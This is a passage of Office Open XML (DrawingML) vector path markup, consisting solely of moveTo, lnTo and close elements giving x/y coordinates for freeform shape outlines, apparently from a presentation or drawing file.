                    <a:pt x="11299" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11226" y="12655"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="11665"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9355" y="9574"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9575" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="11518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="11628"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="11848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="11041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="9574"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="1028" y="7373"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1028" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1101" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1138" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1615" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1578" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1688" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="918" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="955" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="7373"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9612" y="12472"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9942" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10529" y="13316"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10162" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9612" y="12472"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2569" y="5209"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2899" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5467" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5320" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="5833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4660" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3632" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4770" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="12545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="13426"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="10381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2202" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2312" y="8730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1321" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1358" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1505" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1982" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2239" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2569" y="5209"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8805" y="13939"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9098" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="14049"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="13976"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="13939"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5815" y="14178"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5797" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5815" y="14178"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7154" y="2935"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7594" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="3155"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8438" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="3448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="3485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="3558"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9612" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="3815"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9832" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10272" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9942" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="5979"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="7373"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8548" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8805" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7521" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10382" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9612" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="9904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7301" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="11812"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="12362"/>
                  </a:lnTo>
